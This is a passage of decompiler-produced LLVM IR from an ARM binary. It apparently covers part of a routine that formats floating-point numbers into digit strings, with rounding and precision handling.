  %v2_18a90 = add i32 %v4_18a7c.v1_18998.v0_18984, ptrtoint ([4 x i8]* @global_var_23c60.1000 to i32)
  store i32 %v2_18a90, i32* %r2.global-to-local, align 4
  %v2_18a94 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_18a94, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_18fbc

dec_label_pc_18aa0:                               ; preds = %.thread9
  %v0_18aa0 = load i32, i32* @r6, align 4
  store i32 %v0_18aa0, i32* %r1.global-to-local, align 4
  store i32 1100470148, i32* %r3.global-to-local, align 4
  %v0_18aa8 = load i32, i32* @r5, align 4
  store i32 %v0_18aa8, i32* @r0, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v4_18ab0 = call i32 @function_1ddb0(i32 %v0_18aa8)
  store i32 %v4_18ab0, i32* %r0.global-to-local, align 4
  %v2_18ab4 = icmp eq i32 %v4_18ab0, 0
  store i1 %v2_18ab4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18ab4, label %bb208, label %bb207

bb207:                                            ; preds = %dec_label_pc_18aa0
  store i32 1, i32* %r0.global-to-local, align 4
  br label %bb208

bb208:                                            ; preds = %dec_label_pc_18aa0, %bb207
  %v0_18abc = phi i32 [ 0, %dec_label_pc_18aa0 ], [ 1, %bb207 ]
  store i32 add (i32 ptrtoint (i32* @global_var_136dc.996 to i32), i32 100680), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23c78.1003 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23c78.1003 to i32), i32* %stack_var_-208, align 4
  store i32 9, i32* %sl.global-to-local, align 4
  store i32 256, i32* @r4, align 4
  %v2_18af0 = icmp eq i32 %v0_18abc, 0
  br label %dec_label_pc_18ae0

dec_label_pc_18ae0:                               ; preds = %dec_label_pc_18b78.dec_label_pc_18ae0_crit_edge, %bb208
  %v2_18ae8 = phi i32 [ ptrtoint (i32* @global_var_23c78.1003 to i32), %bb208 ], [ %v2_18ae8.pre, %dec_label_pc_18b78.dec_label_pc_18ae0_crit_edge ]
  %v0_18ae4 = phi i32 [ 9, %bb208 ], [ %v0_18b78, %dec_label_pc_18b78.dec_label_pc_18ae0_crit_edge ]
  %v2_18b28 = phi i32 [ 8, %bb208 ], [ %stack_var_-192.3, %dec_label_pc_18b78.dec_label_pc_18ae0_crit_edge ]
  store i32 %v0_18abc, i32* %r2.global-to-local, align 4
  %v1_18ae4 = add i32 %v0_18ae4, -1
  store i32 %v1_18ae4, i32* %sl.global-to-local, align 4
  store i32 %v2_18ae8, i32* @lr, align 4
  %v3_18aec = mul i32 %v1_18ae4, 8
  store i32 %v3_18aec, i32* %r3.global-to-local, align 4
  store i1 %v2_18af0, i1* %cpsr_z.global-to-local, align 1
  %v0_18af4 = load i32, i32* @r5, align 4
  store i32 %v0_18af4, i32* %r0.global-to-local, align 4
  %v0_18af8 = load i32, i32* @r6, align 4
  store i32 %v0_18af8, i32* %r1.global-to-local, align 4
  %v2_18afc = add i32 %v3_18aec, %v2_18ae8
  store i32 %v2_18afc, i32* %ip.global-to-local, align 4
  %v1_18b38 = inttoptr i32 %v2_18afc to i32*
  %v2_18b38 = load i32, i32* %v1_18b38, align 4
  store i32 %v2_18b38, i32* %r2.global-to-local, align 4
  %v3_18b38 = add i32 %v2_18afc, 4
  %v4_18b38 = inttoptr i32 %v3_18b38 to i32*
  %v5_18b38 = load i32, i32* %v4_18b38, align 4
  store i32 %v5_18b38, i32* %r3.global-to-local, align 4
  br i1 %v2_18af0, label %dec_label_pc_18b38, label %dec_label_pc_18b04

dec_label_pc_18b04:                               ; preds = %dec_label_pc_18ae0
  %v4_18b08 = sext i32 %v0_18af4 to i64
  %v5_18b08 = call i32 @function_1d834(i64 %v4_18b08, i32 %v0_18af8, i32 %v2_18b38, i32 %v5_18b38)
  store i32 %v5_18b08, i32* @r0, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1104006501, i32* %r3.global-to-local, align 4
  store i32 %v5_18b08, i32* %r7.global-to-local, align 4
  store i32 %v0_18af8, i32* %r8.global-to-local, align 4
  %v1_18b1c = call i32 @function_1ddb0(i32 %v5_18b08)
  store i32 %v1_18b1c, i32* %r0.global-to-local, align 4
  %v2_18b20 = icmp eq i32 %v1_18b1c, 0
  store i1 %v2_18b20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18b20, label %dec_label_pc_18b78, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_18b04
  %v1_18b28 = load i32, i32* @r4, align 4
  %v3_18b28 = sub i32 %v2_18b28, %v1_18b28
  store i32 %v3_18b28, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18b70

dec_label_pc_18b38:                               ; preds = %dec_label_pc_18ae0
  store i32 %v0_18af4, i32* %r0.global-to-local, align 4
  store i32 %v0_18af8, i32* %r1.global-to-local, align 4
  %v4_18b44 = call i32 @function_1dac4(i32 %v0_18af4, i32 %v0_18af8, i32 %v2_18b38, i32 %v5_18b38)
  store i32 %v4_18b44, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 1100470148, i32* @r3, align 4
  store i32 %v4_18b44, i32* %r7.global-to-local, align 4
  store i32 %v0_18af8, i32* %r8.global-to-local, align 4
  %v4_18b58 = call i32 @function_1dde0(i32 %v4_18b44, i32 %v0_18af8, i32 0, i32 1100470148)
  store i32 %v4_18b58, i32* %r0.global-to-local, align 4
  %v2_18b5c = icmp eq i32 %v4_18b58, 0
  store i1 %v2_18b5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18b5c, label %dec_label_pc_18b78, label %dec_label_pc_18b64

dec_label_pc_18b64:                               ; preds = %dec_label_pc_18b38
  %v1_18b68 = load i32, i32* @r4, align 4
  %v2_18b68 = add i32 %v1_18b68, %v2_18b28
  store i32 %v2_18b68, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18b70

dec_label_pc_18b70:                               ; preds = %.thread10, %dec_label_pc_18b64
  %stack_var_-192.2 = phi i32 [ %v2_18b68, %dec_label_pc_18b64 ], [ %v3_18b28, %.thread10 ]
  %v0_18b70 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_18b70, i32* @r5, align 4
  %v0_18b74 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_18b74, i32* @r6, align 4
  br label %dec_label_pc_18b78

dec_label_pc_18b78:                               ; preds = %dec_label_pc_18b04, %dec_label_pc_18b38, %dec_label_pc_18b70
  %stack_var_-192.3 = phi i32 [ %v2_18b28, %dec_label_pc_18b38 ], [ %stack_var_-192.2, %dec_label_pc_18b70 ], [ %v2_18b28, %dec_label_pc_18b04 ]
  %v0_18b78 = load i32, i32* %sl.global-to-local, align 4
  %v2_18b78 = icmp eq i32 %v0_18b78, 0
  store i1 %v2_18b78, i1* %cpsr_z.global-to-local, align 1
  %v0_18b7c = load i32, i32* @r4, align 4
  %v3_18b7c = sdiv i32 %v0_18b7c, 2
  store i32 %v3_18b7c, i32* @r4, align 4
  br i1 %v2_18b78, label %dec_label_pc_18b84, label %dec_label_pc_18b78.dec_label_pc_18ae0_crit_edge

dec_label_pc_18b78.dec_label_pc_18ae0_crit_edge:  ; preds = %dec_label_pc_18b78
  %v2_18ae8.pre = load i32, i32* %stack_var_-208, align 4
  br label %dec_label_pc_18ae0

dec_label_pc_18b84:                               ; preds = %dec_label_pc_18b78
  %v0_18b84 = load i32, i32* @r5, align 4
  store i32 %v0_18b84, i32* @r0, align 4
  %v0_18b88 = load i32, i32* @r6, align 4
  store i32 %v0_18b88, i32* @r1, align 4
  store i32 0, i32* @r2, align 4
  store i32 1104006501, i32* @r3, align 4
  %v4_18b94 = call i32 @function_1dde0(i32 %v0_18b84, i32 %v0_18b88, i32 0, i32 1104006501)
  store i32 %v4_18b94, i32* %r0.global-to-local, align 4
  %v2_18b98 = icmp eq i32 %v4_18b94, 0
  store i1 %v2_18b98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18b98, label %dec_label_pc_18bc8, label %dec_label_pc_18ba0

dec_label_pc_18ba0:                               ; preds = %dec_label_pc_18b84
  %v0_18ba0 = load i32, i32* @r5, align 4
  store i32 %v0_18ba0, i32* %r0.global-to-local, align 4
  %v0_18ba4 = load i32, i32* @r6, align 4
  store i32 %v0_18ba4, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1076101120, i32* %r3.global-to-local, align 4
  %v4_18bb0 = call i32 @function_1dac4(i32 %v0_18ba0, i32 %v0_18ba4, i32 0, i32 1076101120)
  store i32 %v4_18bb0, i32* %r0.global-to-local, align 4
  store i32 %v4_18bb0, i32* @r5, align 4
  store i32 %v0_18ba4, i32* @r6, align 4
  %v1_18bc0 = add i32 %stack_var_-192.3, 1
  store i32 %v1_18bc0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18bc8

dec_label_pc_18bc8:                               ; preds = %dec_label_pc_18ba0, %bb204, %dec_label_pc_18b84, %dec_label_pc_189e8
  %stack_var_-192.4 = phi i32 [ %stack_var_-192.3, %dec_label_pc_18b84 ], [ -1, %dec_label_pc_189e8 ], [ -1, %bb204 ], [ %v1_18bc0, %dec_label_pc_18ba0 ]
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_18bcc = ptrtoint i32* %stack_var_-81 to i32
  store i32 %v2_18bcc, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_18bd0

dec_label_pc_18bd0:                               ; preds = %dec_label_pc_18c48, %dec_label_pc_18bc8
  %v0_18bd0 = load i32, i32* @r6, align 4
  store i32 %v0_18bd0, i32* %r1.global-to-local, align 4
  %v0_18bd4 = load i32, i32* @r5, align 4
  store i32 %v0_18bd4, i32* %r0.global-to-local, align 4
  %v2_18bd8 = call i32 @function_1de10(i32 %v0_18bd4, i32 %v0_18bd0)
  store i32 %v2_18bd8, i32* @r0, align 4
  store i32 %v2_18bd8, i32* %r8.global-to-local, align 4
  %v0_18be0 = call i32 @function_1d734()
  store i32 %v0_18be0, i32* %r2.global-to-local, align 4
  store i32 %v0_18bd0, i32* %r3.global-to-local, align 4
  %v0_18bec = load i32, i32* @r5, align 4
  store i32 %v0_18bec, i32* @r0, align 4
  %v0_18bf0 = load i32, i32* @r6, align 4
  store i32 %v0_18bf0, i32* %r1.global-to-local, align 4
  %v4_18bf4 = call i32 @function_1d420(i32 %v0_18bec, i32 %v0_18bf0, i32 %v0_18be0, i32 %v0_18bd0)
  store i32 %v4_18bf4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1104006501, i32* %r3.global-to-local, align 4
  %v4_18c00 = sext i32 %v4_18bf4 to i64
  %v5_18c00 = call i32 @function_1d834(i64 %v4_18c00, i32 %v0_18bf0, i32 0, i32 1104006501)
  store i32 %v5_18c00, i32* %r0.global-to-local, align 4
  %v0_18c04 = load i32, i32* %sl.global-to-local, align 4
  %v1_18c04 = add i32 %v0_18c04, 9
  store i32 %v1_18c04, i32* %sl.global-to-local, align 4
  store i32 %v5_18c00, i32* @r5, align 4
  store i32 %v0_18bf0, i32* @r6, align 4
  store i32 0, i32* @r7, align 4
  %v0_18c14.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_18c14

dec_label_pc_18c14:                               ; preds = %dec_label_pc_18c14, %dec_label_pc_18bd0
  %v0_18c14 = phi i32 [ %v0_18c38, %dec_label_pc_18c14 ], [ %v0_18c14.pre, %dec_label_pc_18bd0 ]
  store i32 %v0_18c14, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_18c1c = call i32 @function_12514(i32 %v0_18c14, i32 10)
  %v0_18c20 = load i32, i32* @r7, align 4
  %v1_18c20 = add i32 %v0_18c20, 1
  store i32 %v1_18c20, i32* @r7, align 4
  store i32 58, i32* %r2.global-to-local, align 4
  %v1_18c28 = load i32, i32* %sl.global-to-local, align 4
  %v2_18c28 = sub i32 %v1_18c28, %v1_18c20
  store i32 %v2_18c28, i32* @r3, align 4
  %v0_18c2c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_18c2c, i32* @r0, align 4
  store i32 10, i32* @r1, align 4
  %v3_18c34 = inttoptr i32 %v2_18c28 to i8*
  store i8 58, i8* %v3_18c34, align 1
  %v0_18c38 = call i32 @function_12418()
  store i32 %v0_18c38, i32* %r0.global-to-local, align 4
  %v0_18c3c = load i32, i32* @r7, align 4
  %v7_18c3c = icmp eq i32 %v0_18c3c, 8
  store i1 %v7_18c3c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_18c38, i32* %r8.global-to-local, align 4
  %v7_18c44 = icmp slt i32 %v0_18c3c, 9
  br i1 %v7_18c44, label %dec_label_pc_18c14, label %dec_label_pc_18c48

dec_label_pc_18c48:                               ; preds = %dec_label_pc_18c14
  %v0_18c48 = load i32, i32* @r4, align 4
  %v1_18c48 = add i32 %v0_18c48, 1
  store i32 %v1_18c48, i32* %r4.global-to-local, align 4
  %v7_18c4c = icmp eq i32 %v0_18c48, 0
  store i1 %v7_18c4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18c4c, label %dec_label_pc_18bd0, label %dec_label_pc_18c54

dec_label_pc_18c54:                               ; preds = %dec_label_pc_18c48
  %v0_18c54 = load i32, i32* %sb.global-to-local, align 4
  %v7_18c54 = icmp eq i32 %v0_18c54, 96
  store i1 %v7_18c54, i1* %cpsr_z.global-to-local, align 1
  %tmp270 = icmp ult i32 %v0_18c54, 97
  br i1 %tmp270, label %bb209, label %thread-pre-split

bb209:                                            ; preds = %dec_label_pc_18c54
  %v5_18c64 = add i32 %v0_18c54, 32
  store i32 %v5_18c64, i32* %r3.global-to-local, align 4
  %v5_18c68 = urem i32 %v5_18c64, 256
  store i32 %v5_18c68, i32* %sb.global-to-local, align 4
  br label %bb210

thread-pre-split:                                 ; preds = %dec_label_pc_18c54
  %v4_18c60.pre126131 = load i32, i32* @r3, align 4
  %phitmp = urem i32 %v4_18c60.pre126131, 256
  br label %bb210

bb210:                                            ; preds = %thread-pre-split, %bb209
  %v4_18c60123127 = phi i32 [ %phitmp, %thread-pre-split ], [ 69, %bb209 ]
  %v0_18c88 = phi i32 [ %v0_18c54, %thread-pre-split ], [ %v5_18c68, %bb209 ]
  %v7_18c6c = icmp eq i32 %v0_18c88, 103
  %. = zext i1 %v7_18c6c to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v0_18c78 = load i32, i32* %fp.global-to-local, align 4
  %v2_18c78 = icmp eq i32 %v0_18c78, 0
  store i1 %v2_18c78, i1* %cpsr_z.global-to-local, align 1
  %tmp213 = icmp slt i32 %v0_18c78, 1
  br i1 %tmp213, label %.thread16, label %bb214

.thread16:                                        ; preds = %bb210
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb216

bb214:                                            ; preds = %bb210
  %v2_18c80 = icmp eq i1 %v7_18c6c, false
  store i1 %v2_18c80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18c80, label %bb216, label %bb215

bb215:                                            ; preds = %bb214
  %v2_18c84 = add i32 %v0_18c78, -1
  store i32 %v2_18c84, i32* %fp.global-to-local, align 4
  br label %bb216

bb216:                                            ; preds = %.thread16, %bb214, %bb215
  %v0_18c98 = phi i32 [ %v0_18c78, %.thread16 ], [ %v0_18c78, %bb214 ], [ %v2_18c84, %bb215 ]
  %v7_18c88 = icmp eq i32 %v0_18c88, 102
  store i1 %v7_18c88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18c88, label %dec_label_pc_18c94, label %bb217

bb217:                                            ; preds = %bb216
  store i32 %v0_18c98, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_18cbc

dec_label_pc_18c94:                               ; preds = %bb216
  store i32 %stack_var_-192.4, i32* %r3.global-to-local, align 4
  %v2_18c98 = add i32 %v0_18c98, %stack_var_-192.4
  store i32 %v2_18c98, i32* %ip.global-to-local, align 4
  %v8_18c9c = icmp eq i32 %v2_18c98, -1
  store i1 %v8_18c9c, i1* %cpsr_z.global-to-local, align 1
  %v6_18ca0 = icmp slt i32 %v2_18c98, -1
  br i1 %v6_18ca0, label %dec_label_pc_18ca4, label %dec_label_pc_18cbc

dec_label_pc_18ca4:                               ; preds = %dec_label_pc_18c94
  %v2_18ca4 = ptrtoint i32* %stack_var_-83 to i32
  store i32 %v2_18ca4, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r1.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v2_18cb0 = bitcast i32* %stack_var_-83 to i8*
  %v3_18cb0 = call i32 @function_13ed0(i8* %v2_18cb0, i32 48)
  store i32 %v3_18cb0, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_18cbc

dec_label_pc_18cbc:                               ; preds = %bb217, %dec_label_pc_18c94, %dec_label_pc_18ca4
  %v1_18d0090 = phi i32 [ %v3_18cb0, %dec_label_pc_18ca4 ], [ %v0_18c38, %dec_label_pc_18c94 ], [ %v0_18c38, %bb217 ]
  %v1_18ce4 = phi i32 [ -1, %dec_label_pc_18ca4 ], [ %v2_18c98, %dec_label_pc_18c94 ], [ %v0_18c98, %bb217 ]
  %stack_var_-192.5 = phi i32 [ -1, %dec_label_pc_18ca4 ], [ %stack_var_-192.4, %dec_label_pc_18c94 ], [ %stack_var_-192.4, %bb217 ]
  %v1_18cc0 = add i32 %v1_18ce4, -16
  %v3_18cc0 = sub i32 15, %v1_18ce4
  %v4_18cc0 = and i32 %v3_18cc0, %v1_18ce4
  %v5_18cc0 = icmp slt i32 %v4_18cc0, 0
  %v6_18cc0 = icmp slt i32 %v1_18cc0, 0
  %v7_18cc0 = icmp eq i32 %v1_18ce4, 16
  store i1 %v7_18cc0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-82, align 4
  %v2_18ccc = ptrtoint i32* %stack_var_-83 to i32
  store i32 %v2_18ccc, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-83, align 4
  %v3_18cd4 = xor i1 %v6_18cc0, %v5_18cc0
  %v4_18cd4 = or i1 %v7_18cc0, %v3_18cd4
  br i1 %v4_18cd4, label %dec_label_pc_18ce0, label %.thread137

.thread137:                                       ; preds = %dec_label_pc_18cbc
  %v7_18cd4134138 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v7_18cd4134138, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

dec_label_pc_18ce0:                               ; preds = %dec_label_pc_18cbc
  %v2_18ce0 = ptrtoint i32* %stack_var_-82 to i32
  %v2_18ce4 = add i32 %v1_18ce4, %v2_18ce0
  store i32 %v2_18ce4, i32* %r3.global-to-local, align 4
  %v1_18ce8 = add i32 %v2_18ce4, 2
  %v2_18ce8 = inttoptr i32 %v1_18ce8 to i8*
  %v3_18ce8 = load i8, i8* %v2_18ce8, align 1
  %v4_18ce8 = zext i8 %v3_18ce8 to i32
  store i32 %v4_18ce8, i32* %r2.global-to-local, align 4
  store i32 %v1_18ce8, i32* %r1.global-to-local, align 4
  %v2_18cf0 = icmp ugt i8 %v3_18ce8, 51
  %v7_18cf0 = icmp eq i8 %v3_18ce8, 52
  store i1 %v7_18cf0, i1* %cpsr_z.global-to-local, align 1
  %v2_18cf4 = xor i1 %v2_18cf0, true
  %v3_18cf4 = or i1 %v7_18cf0, %v2_18cf4
  br i1 %v3_18cf4, label %bb218, label %bb219

bb218:                                            ; preds = %dec_label_pc_18ce0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb219

bb219:                                            ; preds = %dec_label_pc_18ce0, %bb218
  %v1_18d0088 = phi i32 [ %v1_18d0090, %dec_label_pc_18ce0 ], [ 0, %bb218 ]
  %v2_18cf8 = xor i1 %v7_18cf0, true
  %v3_18cf8 = and i1 %v2_18cf0, %v2_18cf8
  br i1 %v3_18cf8, label %bb220, label %.preheader

bb220:                                            ; preds = %bb219
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb219, %bb220, %.thread137, %._crit_edge85
  %v0_18cfc = phi i32 [ %v0_18cfc.pre, %._crit_edge85 ], [ %v7_18cd4134138, %.thread137 ], [ %v1_18ce8, %bb219 ], [ %v1_18ce8, %bb220 ]
  %v1_18d00 = phi i32 [ %v1_18d00.pre, %._crit_edge85 ], [ 0, %.thread137 ], [ %v1_18d0088, %bb219 ], [ 1, %bb220 ]
  %v1_18cfc = add i32 %v0_18cfc, -1
  %v2_18cfc = inttoptr i32 %v1_18cfc to i8*
  %v3_18cfc = load i8, i8* %v2_18cfc, align 1
  %v4_18cfc = zext i8 %v3_18cfc to i32
  store i32 %v1_18cfc, i32* %r1.global-to-local, align 4
  %v2_18d00 = add i32 %v4_18cfc, %v1_18d00
  %v1_18d04 = urem i32 %v2_18d00, 256
  store i32 %v1_18d04, i32* %r3.global-to-local, align 4
  %v2_18d08 = icmp ugt i32 %v1_18d04, 56
  %v7_18d08 = icmp eq i32 %v1_18d04, 57
  store i1 %v7_18d08, i1* %cpsr_z.global-to-local, align 1
  %v2_18d0c = xor i1 %v2_18d08, true
  %v3_18d0c = or i1 %v7_18d08, %v2_18d0c
  br i1 %v3_18d0c, label %bb221, label %bb222

bb221:                                            ; preds = %.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  br label %bb222

bb222:                                            ; preds = %.preheader, %bb221
  %v2_18d10 = xor i1 %v7_18d08, true
  %v3_18d10 = and i1 %v2_18d08, %v2_18d10
  br i1 %v3_18d10, label %bb223, label %bb222.bb224_crit_edge

bb222.bb224_crit_edge:                            ; preds = %bb222
  %v1_18d18.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb224

bb223:                                            ; preds = %bb222
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb224

bb224:                                            ; preds = %bb222.bb224_crit_edge, %bb223
  %v1_18d18 = phi i32 [ %v1_18d18.pre, %bb222.bb224_crit_edge ], [ 1, %bb223 ]
  %v7_18d14 = icmp eq i32 %v1_18d04, 48
  store i1 %v7_18d14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18d14, label %bb225, label %._crit_edge91

bb225:                                            ; preds = %bb224
  %v2_18d18 = or i32 %v1_18d18, 1
  store i32 %v2_18d18, i32* %r2.global-to-local, align 4
  br label %._crit_edge91

._crit_edge91:                                    ; preds = %bb224, %bb225
  %v0_18d1c = phi i32 [ 1, %bb225 ], [ %v1_18d18, %bb224 ]
  %v2_18d1c = icmp eq i32 %v0_18d1c, 0
  store i1 %v2_18d1c, i1* %cpsr_z.global-to-local, align 1
  %v1_18d20 = trunc i32 %v2_18d00 to i8
  store i8 %v1_18d20, i8* %v2_18cfc, align 1
  %v0_18d24 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18d24, label %dec_label_pc_18d28, label %._crit_edge85

._crit_edge85:                                    ; preds = %._crit_edge91
  %v1_18d00.pre = load i32, i32* %r0.global-to-local, align 4
  %v0_18cfc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_18d28:                               ; preds = %._crit_edge91
  store i32 %v2_18ccc, i32* %r2.global-to-local, align 4
  %v2_18d2c = ptrtoint i32* %stack_var_-82 to i32
  store i32 %v2_18d2c, i32* %r3.global-to-local, align 4
  %v0_18d30 = load i32, i32* %r1.global-to-local, align 4
  %v3_18d30 = icmp uge i32 %v0_18d30, %v2_18d2c
  %v9_18d30 = icmp eq i32 %v0_18d30, %v2_18d2c
  store i1 %v9_18d30, i1* %cpsr_z.global-to-local, align 1
  %v2_18d34 = xor i1 %v3_18d30, true
  %v3_18d34 = or i1 %v9_18d30, %v2_18d34
  br i1 %v3_18d34, label %bb226, label %.thread142

bb226:                                            ; preds = %dec_label_pc_18d28
  store i32 %stack_var_-192.5, i32* @lr, align 4
  store i32 %v2_18d2c, i32* %r2.global-to-local, align 4
  store i32 %v2_18d2c, i32* %r1.global-to-local, align 4
  br label %.thread142

.thread142:                                       ; preds = %dec_label_pc_18d28, %bb226
  %v2_18d54 = phi i32 [ %v2_18d2c, %bb226 ], [ %v0_18d30, %dec_label_pc_18d28 ]
  %v4_18d48141 = phi i32 [ %v2_18d2c, %bb226 ], [ %v2_18ccc, %dec_label_pc_18d28 ]
  %v2_18d40 = xor i1 %v9_18d30, true
  %v3_18d40 = and i1 %v3_18d30, %v2_18d40
  br i1 %v3_18d40, label %bb227, label %bb228

bb227:                                            ; preds = %.thread142
  store i32 %stack_var_-192.5, i32* %r0.global-to-local, align 4
  br label %bb228

bb228:                                            ; preds = %.thread142, %bb227
  br i1 %v3_18d34, label %bb229, label %bb230

bb229:                                            ; preds = %bb228
  %v4_18d44 = load i32, i32* @lr, align 4
  %v5_18d44 = add i32 %v4_18d44, 1
  store i32 %v5_18d44, i32* %r0.global-to-local, align 4
  br label %bb230

bb230:                                            ; preds = %bb228, %bb229
  br i1 %v3_18d40, label %bb231, label %bb232

bb231:                                            ; preds = %bb230
  %v5_18d48 = add i32 %v4_18d48141, 2
  store i32 %v5_18d48, i32* %r2.global-to-local, align 4
  br label %bb232

bb232:                                            ; preds = %bb230, %bb231
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_18d50 = load i32, i32* %sb.global-to-local, align 4
  %v7_18d50 = icmp eq i32 %v0_18d50, 103
  store i1 %v7_18d50, i1* %cpsr_z.global-to-local, align 1
  %v3_18d54 = add i32 %v2_18d54, 1
  %v4_18d54 = inttoptr i32 %v3_18d54 to i8*
  store i8 0, i8* %v4_18d54, align 1
  %v0_18d58 = load i32, i32* %r1.global-to-local, align 4
  %v1_18d58 = add i32 %v0_18d58, 1
  store i32 %v1_18d58, i32* %lr.global-to-local, align 4
  %v0_18d5c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18d5c, label %dec_label_pc_18d60, label %dec_label_pc_18d88

dec_label_pc_18d60:                               ; preds = %bb232
  %v0_18d60 = load i32, i32* %r0.global-to-local, align 4
  %v1_18d60 = load i32, i32* %ip.global-to-local, align 4
  %v2_18d60 = sub i32 %v0_18d60, %v1_18d60
  %v4_18d60 = xor i32 %v1_18d60, %v0_18d60
  %v5_18d60 = xor i32 %v2_18d60, %v0_18d60
  %v6_18d60 = and i32 %v5_18d60, %v4_18d60
  %v7_18d60 = icmp slt i32 %v6_18d60, 0
  %v8_18d60 = icmp slt i32 %v2_18d60, 0
  %v9_18d60 = icmp eq i32 %v0_18d60, %v1_18d60
  %v3_18d64 = xor i1 %v8_18d60, %v7_18d60
  %v4_18d64 = or i1 %v9_18d60, %v3_18d64
  %.254 = zext i1 %v4_18d64 to i32
  store i32 %.254, i32* %r3.global-to-local, align 4
  %v1_18d6c = add i32 %v0_18d60, 4
  %v3_18d6c = sub i32 0, %v0_18d60
  %v4_18d6c = and i32 %v1_18d6c, %v3_18d6c
  %v5_18d6c = icmp slt i32 %v4_18d6c, 0
  %v6_18d6c = icmp slt i32 %v1_18d6c, 0
  %v7_18d6c = icmp eq i32 %v1_18d6c, 0
  store i1 %v7_18d6c, i1* %cpsr_z.global-to-local, align 1
  %v2_18d70 = xor i1 %v6_18d6c, %v5_18d6c
  br i1 %v2_18d70, label %.thread21, label %bb235

.thread21:                                        ; preds = %dec_label_pc_18d60
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_190a4

bb235:                                            ; preds = %dec_label_pc_18d60
  %v2_18d74 = icmp eq i1 %v4_18d64, false
  store i1 %v2_18d74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18d74, label %dec_label_pc_190a4, label %.thread24

.thread24:                                        ; preds = %bb235
  %v3_18d78 = sub i32 %v1_18d60, %v0_18d60
  store i32 %v3_18d78, i32* %fp.global-to-local, align 4
  store i32 102, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_18d94

dec_label_pc_18d88:                               ; preds = %bb232
  %v0_18d88 = load i32, i32* %sb.global-to-local, align 4
  %v7_18d88 = icmp eq i32 %v0_18d88, 102
  store i1 %v7_18d88, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_18d88, i32* %r8.global-to-local, align 4
  br i1 %v7_18d88, label %dec_label_pc_18d88.dec_label_pc_18d94_crit_edge, label %dec_label_pc_18da4

dec_label_pc_18d88.dec_label_pc_18d94_crit_edge:  ; preds = %dec_label_pc_18d88
  %v0_18d94.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18d94

dec_label_pc_18d94:                               ; preds = %.thread24, %dec_label_pc_18d88.dec_label_pc_18d94_crit_edge
  %v0_18d94 = phi i32 [ %v0_18d94.pre, %dec_label_pc_18d88.dec_label_pc_18d94_crit_edge ], [ %v0_18d60, %.thread24 ]
  %v1_18d94 = icmp slt i32 %v0_18d94, 0
  %v2_18d94 = icmp eq i32 %v0_18d94, 0
  store i1 %v2_18d94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_18d94, label %bb236, label %dec_label_pc_18da4

bb236:                                            ; preds = %dec_label_pc_18d94
  store i32 48, i32* %r3.global-to-local, align 4
  %v5_18d9c = load i32, i32* %r2.global-to-local, align 4
  %v6_18d9c = add i32 %v5_18d9c, -1
  %v7_18d9c = inttoptr i32 %v6_18d9c to i8*
  store i8 48, i8* %v7_18d9c, align 1
  %v8_18d9c = load i32, i32* %r2.global-to-local, align 4
  %v9_18d9c = add i32 %v8_18d9c, -1
  store i32 %v9_18d9c, i32* %r2.global-to-local, align 4
  %v0_18da0.pre = load i32, i32* %r0.global-to-local, align 4
